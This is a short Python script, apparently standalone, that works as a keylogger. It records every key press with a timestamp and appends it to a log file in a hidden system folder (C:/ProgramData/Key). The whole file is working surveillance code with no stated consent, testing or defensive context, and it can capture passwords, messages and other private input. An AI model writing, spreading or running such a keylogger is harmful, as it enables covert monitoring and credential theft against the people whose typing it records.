import os
import keyboard
import datetime

folder_path = "C:/ProgramData/Key"
log_file_path = os.path.join(folder_path, "log.txt")

if not os.path.exists(folder_path):
    os.makedirs(folder_path)

with open(log_file_path, "a") as log_file:
    while True:
        event = keyboard.read_event()

        if event.event_type == "down":
            now = datetime.datetime.now()
            log_file.write(f"[{now.strftime('%Y-%m-%d %H:%M:%S')}] {event.name}\n")
            log_file.flush()
